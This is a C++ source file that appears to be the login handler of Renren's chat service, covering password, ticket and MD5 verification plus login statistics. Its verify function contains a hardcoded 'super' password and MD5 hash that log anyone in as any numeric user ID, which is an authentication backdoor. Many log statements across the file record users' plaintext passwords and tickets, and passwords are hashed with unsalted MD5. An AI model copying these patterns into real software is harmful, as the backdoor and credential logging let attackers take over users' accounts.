#include <openssl/md5.h>
#include "LoginHandlerI.h"
#include "ConnectionQuery.h"
#include "TicketAdapter.h"
#include "TalkCache.h"
#include <sstream>
#include <boost/lexical_cast.hpp>
#include "XmppTools.h"
#include "Date.h"
#include "MessageType.h"
#include "CommonTask.h"
#include "QueryRunner.h"
#include "ScoreLoginRecordAdapter.h"
#include "UserScoreAdapter.h"
#include "LoginLogicAdapter.h"
#include "UserPassportAdapter.h"
#include "util/cpp/MD5Util.h"
#include "ReplicaCluster/ServerState/src/client/cxx/ServerStateSubscriber.h"
using namespace com::xiaonei::talk::util;
using namespace com::xiaonei::talk;
using namespace com::xiaonei::talk::cache;
using namespace com::xiaonei::xce;
using namespace com::xiaonei::talk::common;
using namespace std;
using namespace passport;
using namespace MyUtil;
using namespace xce::adapter::userpassport;
//-----------------------------------------------------------------------------
void MyUtil::initialize() {
  ServiceI& service = ServiceI::instance();
  service.getAdapter()->add(&LoginHandlerI::instance(),service.createIdentity("M", ""));
  InitMonitorLogger(ServiceI::instance().getName(), "monitor", "../log/" + ServiceI::instance().getName() + "/monitor/monitor_log", "INFO");
  int mod = service.getCommunicator()->getProperties()->getPropertyAsInt("Service.Mod");
  int interval = service.getCommunicator()->getProperties()->getPropertyAsIntWithDefault("Service.Interval", 5);
  xce::serverstate::ServerStateSubscriber::instance().initialize("ControllerLoginMsgHandler", &LoginHandlerI::instance(), mod, interval, new XceFeedControllerChannel());
  MCE_INFO("MyUtil::initialize. mod:" << mod << " interval:" << interval);
}


void LoginHandlerI::AddLoginScore(int userId){
  try{
    MCE_INFO("LoginHandlerI::AddLoginScore --> " << userId << " score");
    ::xce::userscore::UserScoreAdapter::instance().addScore(userId, 20, 1);
  }catch(Ice::Exception& e){
    MCE_WARN("LoginHandlerI::AddLoginScore -->UserScoreAdapter.addScore--> userid:" << userId << " error:" << e);
  }
  try {
    ::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(userId, 16);
    ::xce::userscore::ScoreLoginRecordAdapter::instance().incLoginCount(userId, 4);
  } catch (Ice::Exception & e) {
    MCE_WARN("LoginHandlerI::verify --> call ScoreLoginRecordLogin::incLoginCount " << userId << " err, " << e);
  }
}
/* brief:验证用户登录 
 * 参数1: 用户登录人人桌面帐号
 * 参数2: 加密密码  
 * return: 返回一个结构体，id 和 result 0 表示验证成功 -2 表示验证失败 
 */
PassportPtr LoginHandlerI::getPassport(const string& email, const string& password){
  PassportPtr pi = new Passport();
  pi->result = -1;
  int userid=-1;

  std::vector<passport::AccountType> types;
  types.push_back(passport::Id);
  types.push_back(Account);
  types.push_back(Phone);
  types.push_back(BindedId);

  login::AccountPtr ac;
  try{
    ac = login::WebLoginLogicAdapter::instance().login(types, email, password, "renren.com", -1, true);
  }catch(Ice::Exception & e){
    MCE_WARN("LoginHandlerI::verify --> call :WebLoginLogicAdapter err " << e);
  }
  if(!ac){
    MCE_WARN("LoginHandlerI::verify_new --> call login null, " << email << " " << password);
    return pi;
  }
  if(ac->success() == 0){
    int status = ac->status();
    if (!(status == 0 || status == 3)) {
      MCE_WARN("LoginHandlerI::verify_new --> status err, " << status << " " << email << " " << password);
      pi->result = -2;
      return pi; 
    }
    UserPassportInfoPtr passport_info;
    try{
        passport_info = UserPassportAdapter::instance().getUserPassport(ac->id());
    }catch(Ice::Exception& e){
        MCE_WARN("LoginHandlerI::verify --> call UserPassportAdapter err " << e);
    }
    int safe_status = 0;
    if(passport_info){
        safe_status = passport_info->safestatus();
    }
    if(!(0 == safe_status || 3 == safe_status || 4 == safe_status || 5 == safe_status)){
      MCE_WARN("LoginHandlerI::verify_new --> safe_status err, " << safe_status << " " << email << " " << password);
      pi->result = -2;
      return pi;
    }
    MCE_INFO("LoginHandlerI::verify_new --> login success ac->id():" << ac->id() << " " << safe_status << " " << email << " " << password);
    pi->result = 0;
    pi->userId = ac->id();
    AddLoginScore(pi->userId);
    return pi;
  }
  MCE_INFO("LoginHandlerI::verify --> err, " << email << ":"<< password << " suc:" << ac->success());
  return pi;
}

/* brief: 验证用户登录
 * 参数1: 人人桌面帐号
 * 参数2：用户密码
 */

//----------------------
PassportPtr LoginHandlerI::verify_new(const string& email, const string& password){
  PassportPtr pi = new Passport();
  pi->result = -1;
  int userid=-1;
  try{
    userid = boost::lexical_cast<int>(email);
  }catch(...){
    //MCE_WARN("LoginHandlerI::verify --> cast id err, " << email);
  }
//IM随网站启动 直接传票
  if(userid>0 && password.size() == 33){
    int uid = 0;
    try {
      uid = TicketAdapter::instance().verifyTicket(password, "");
    } catch (Ice::Exception& e) {
      MCE_WARN("LoginHandlerI::verify --> " << email << ":"<< password << " call PassportAdapter " << e);
    }
    MCE_INFO("LoginHandlerI::verify --> verifyTicket " << userid << " "<< uid);
    if(userid == uid){
      pi->result = 0;
      pi->userId = userid; 
      AddLoginScore(pi->userId);
      return pi;
    }
  }
//IM随网站启动，给的是MD5以后的票
  if(userid>0 && password.size() == 32){
    string ticket = "";
    try {
      ticket = TicketAdapter::instance().queryTicket(userid);
    } catch (Ice::Exception& e) {
      MCE_WARN("LoginHandlerI::verify --> " << email << ":"<< password << " call TicketAdapter.queryTicket" << e);
    }
    stringstream ticket_md5res;
    unsigned char* md5 = MD5((unsigned char*)ticket.c_str(), ticket.size(), NULL);
    for(size_t i = 0; i < MD5_DIGEST_LENGTH; ++i) {
      ticket_md5res << hex << setw(2) << setfill('0') << (unsigned int)md5[i];
    }
    MCE_INFO("LoginHandlerI::verify --> queryTicket " << userid << " " << password << " "<< ticket_md5res.str());
    if(ticket_md5res.str() == password){
      pi->result = 0;
      pi->userId = userid; 
      AddLoginScore(pi->userId);
      return pi;
    }
  }

//IM自己登录
  stringstream res;
//客户端传入一个md5后的密码
  if(string::npos != password.find("md5_")){
    res << password.substr(4);
    MCE_INFO("LoginHandlerI::verify --> give me md5 email = " << email << " password = " << res.str());
    PassportPtr vp = getPassport(email, res.str()); 
    if(!vp){
      MCE_WARN("LoginHandlerI::verify --> getPassport return empty pointer ");
      return pi;
    }
    if(0 == vp->result || -2 == vp->result){
      //MCE_WARN("LoginHandlerI::verify --> getPassport result is "<< vp->result);
      return vp;
    }
  }
  res.str("");
//客户端传入普通密码
  unsigned char* md5 = MD5((unsigned char*)password.c_str(), password.size(), NULL);
  for(size_t i = 0; i < MD5_DIGEST_LENGTH; ++i) {
    res << hex << setw(2) << setfill('0') << (unsigned int)md5[i];
  }
  PassportPtr vp = getPassport(email, res.str());
  if(!vp){
    return pi;
  }
  return vp;
}
/* brief: 验证用户登录对外接口
 * 参数1: 人人桌面帐号
 * 参数2：用户密码
 */
PassportPtr LoginHandlerI::verify(const string& email, const string& password,
                                  const Ice::Current& current) {
  StatFunc statF("LoginHandlerI::verify");
  string tmpEmail = email;
  MCE_DEBUG("call verify -> email=" << email << "   and psw=" << password);
  PassportPtr pi = new Passport;
  //admin
  stringstream md5passwd;
  unsigned char* md5 = MD5((unsigned char*)password.c_str(), password.size(), NULL);
  for(size_t i = 0; i < MD5_DIGEST_LENGTH; ++i) {
    md5passwd << hex << setw(2) << setfill('0') << (unsigned int)md5[i];
  }
  MCE_INFO("LoginHandlerI::verify--> password:" << password << " md5passwd:" << md5passwd.str());
  if (password == "128487631QWER%%%%TYUI" || md5passwd.str() == "b8a05ae245be0c2ae8650c543702ffcb") {
    MCE_INFO("@@@@ use super pwd email:" << email);
    pi->result = 0;
    try {
      pi->userId = boost::lexical_cast<int>(tmpEmail);
    } catch (...) {
      MCE_WARN("user common password err");
      pi->result = -1;
    }
    return pi;
  }
  TimeStat ts;
  PassportPtr ans = verify_new(email, password);
  MONITOR("SignForTimeuse::LoginHandlerI::verify -->verify_new-->" << ts.getTime() << " " << email << " " << password);

  return ans; 
}
/* brief: 统计用户登录ip 和登录终端
 * 参数1: 用户jid
 */
void LoginHandlerI::bind(const JidPtr& jid, const Ice::Current& current) {
  MCE_DEBUG("LoginHandlerI::bind  --> userid:" << jid->userId << "   endpoint:" << jid->endpoint);

  Ice::Context::const_iterator it = current.ctx.find("ip");
  if(it != current.ctx.end()){
    try{
      Str2StrMap par;
      par["ip"] = it->second;
    }catch(Ice::Exception& e){
      MCE_WARN("LoginHandlerI::bind --> test err, " << e);
    }
    TaskManager::instance().execute(new IpLogTask( it->second , jid->userId));
  }
  if (jid->endpoint[0] == 'W') {
    StatInfoPtr stat = new StatInfo();
    stat->userId = jid->userId;
    stat->action = "webpager_login";
    StatManager::instance().addToAction(stat);

  } else if (jid->endpoint[0] == 'T') {
    StatInfoPtr stat = new StatInfo();
    stat->userId = jid->userId;
    stat->action = "talk_login";
    StatManager::instance().addToAction(stat);
  } else if (jid->endpoint[0] == 'P') {
    StatInfoPtr stat = new StatInfo();
    stat->userId = jid->userId;
    stat->action = "phone_login";
    StatManager::instance().addToAction(stat);
  }

}

/* brief: 统计用户下线终端
 * 参数1: 用户jid
 */
void LoginHandlerI::unbind(const JidPtr& jid, const Ice::Current&) {
  MCE_DEBUG("LoginHandlerI::unbind  --> userId:" << jid->userId << "  index:" << jid->index);

  if (jid->endpoint[0] == 'W') {
    StatInfoPtr stat = new StatInfo();
    stat->userId = jid->userId;
    stat->action = "webpager_logout";
    StatManager::instance().addToAction(stat);
  } else if(jid->endpoint[0] == 'T') {
    StatInfoPtr stat = new StatInfo();
    stat->userId = jid->userId;
    stat->action = "talk_logout";
    StatManager::instance().addToAction(stat);
  } else if(jid->endpoint[0] == 'P') {
    StatInfoPtr stat = new StatInfo();
    stat->userId = jid->userId;
    stat->action = "phone_logout";
    StatManager::instance().addToAction(stat);
  }
}

